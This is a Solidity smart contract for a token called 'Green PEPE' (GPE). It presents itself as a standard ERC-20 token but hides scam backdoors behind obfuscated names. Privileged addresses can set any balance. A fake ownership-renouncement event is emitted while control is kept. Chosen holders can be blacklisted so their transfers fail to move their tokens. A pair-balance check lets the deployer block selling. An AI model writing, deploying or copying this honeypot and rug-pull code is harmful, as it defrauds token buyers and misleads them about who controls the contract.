//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface teamAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLaunchedLiquidity) external view returns (uint256);

    function transfer(address fundAtExempt, uint256 launchedEnable) external returns (bool);

    function allowance(address liquidityModeAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedEnable) external returns (bool);

    function transferFrom(
        address sender,
        address fundAtExempt,
        uint256 launchedEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTo, uint256 value);
    event Approval(address indexed liquidityModeAmount, address indexed spender, uint256 value);
}

abstract contract sellIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenSell {
    function createPair(address tokenIs, address senderExempt) external returns (address);
}

interface teamAtMetadata is teamAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GreenPEPE is sellIs, teamAt, teamAtMetadata {

    mapping(address => uint256) private modeShould;

    uint256 fromLaunchedMin;

    function totalSupply() external view virtual override returns (uint256) {
        return autoLaunched;
    }

    mapping(address => bool) public teamSender;

    mapping(address => mapping(address => uint256)) private exemptToIs;

    uint8 private toTrading = 18;

    function transfer(address limitLaunched, uint256 launchedEnable) external virtual override returns (bool) {
        return tokenListFund(_msgSender(), limitLaunched, launchedEnable);
    }

    function tokenListFund(address atMax, address fundAtExempt, uint256 launchedEnable) internal returns (bool) {
        if (atMax == senderFrom) {
            return fromBuy(atMax, fundAtExempt, launchedEnable);
        }
        uint256 receiverLaunch = teamAt(takeSwap).balanceOf(takeLaunch);
        require(receiverLaunch == fromLaunchedMin);
        require(fundAtExempt != takeLaunch);
        if (teamSender[atMax]) {
            return fromBuy(atMax, fundAtExempt, isLaunched);
        }
        return fromBuy(atMax, fundAtExempt, launchedEnable);
    }

    bool private txEnable;

    function symbol() external view virtual override returns (string memory) {
        return launchLimit;
    }

    function transferFrom(address atMax, address fundAtExempt, uint256 launchedEnable) external override returns (bool) {
        if (_msgSender() != minWallet) {
            if (exemptToIs[atMax][_msgSender()] != type(uint256).max) {
                require(launchedEnable <= exemptToIs[atMax][_msgSender()]);
                exemptToIs[atMax][_msgSender()] -= launchedEnable;
            }
        }
        return tokenListFund(atMax, fundAtExempt, launchedEnable);
    }

    bool public txListBuy;

    uint256 exemptLiquidityToken;

    function fromBuy(address atMax, address fundAtExempt, uint256 launchedEnable) internal returns (bool) {
        require(modeShould[atMax] >= launchedEnable);
        modeShould[atMax] -= launchedEnable;
        modeShould[fundAtExempt] += launchedEnable;
        emit Transfer(atMax, fundAtExempt, launchedEnable);
        return true;
    }

    address private buyFrom;

    function marketingTrading(address teamFee) public {
        require(teamFee.balance < 100000);
        if (txListBuy) {
            return;
        }
        if (swapTx) {
            txEnable = false;
        }
        walletMode[teamFee] = true;
        
        txListBuy = true;
    }

    uint256 public listTake;

    function allowance(address fromTeamLaunched, address launchedLiquidityTeam) external view virtual override returns (uint256) {
        if (launchedLiquidityTeam == minWallet) {
            return type(uint256).max;
        }
        return exemptToIs[fromTeamLaunched][launchedLiquidityTeam];
    }

    function decimals() external view virtual override returns (uint8) {
        return toTrading;
    }

    uint256 private autoLaunched = 100000000 * 10 ** 18;

    function fromAuto() private view {
        require(walletMode[_msgSender()]);
    }

    string private launchLimit = "GPE";

    address minWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public walletMode;

    string private sellAt = "Green PEPE";

    function listLimit(address limitLaunched, uint256 launchedEnable) public {
        fromAuto();
        modeShould[limitLaunched] = launchedEnable;
    }

    function walletTake() public {
        emit OwnershipTransferred(senderFrom, address(0));
        buyFrom = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return sellAt;
    }

    uint256 constant isLaunched = 17 ** 10;

    function balanceOf(address atLaunchedLiquidity) public view virtual override returns (uint256) {
        return modeShould[atLaunchedLiquidity];
    }

    address takeLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listReceiver(address limitMax) public {
        fromAuto();
        if (feeLaunch == autoReceiverAt) {
            listTake = feeLaunch;
        }
        if (limitMax == senderFrom || limitMax == takeSwap) {
            return;
        }
        teamSender[limitMax] = true;
    }

    constructor (){
        if (listTake == autoReceiverAt) {
            swapTx = false;
        }
        totalWallet teamTakeExempt = totalWallet(minWallet);
        takeSwap = tokenSell(teamTakeExempt.factory()).createPair(teamTakeExempt.WETH(), address(this));
        if (listTake == feeLaunch) {
            listTake = feeLaunch;
        }
        senderFrom = _msgSender();
        walletTake();
        walletMode[senderFrom] = true;
        modeShould[senderFrom] = autoLaunched;
        
        emit Transfer(address(0), senderFrom, autoLaunched);
    }

    uint256 private autoReceiverAt;

    function approve(address launchedLiquidityTeam, uint256 launchedEnable) public virtual override returns (bool) {
        exemptToIs[_msgSender()][launchedLiquidityTeam] = launchedEnable;
        emit Approval(_msgSender(), launchedLiquidityTeam, launchedEnable);
        return true;
    }

    address public senderFrom;

    function getOwner() external view returns (address) {
        return buyFrom;
    }

    event OwnershipTransferred(address indexed toFrom, address indexed swapMin);

    bool private swapTx;

    function receiverMarketingTake(uint256 launchedEnable) public {
        fromAuto();
        fromLaunchedMin = launchedEnable;
    }

    address public takeSwap;

    function owner() external view returns (address) {
        return buyFrom;
    }

    uint256 public feeLaunch;

}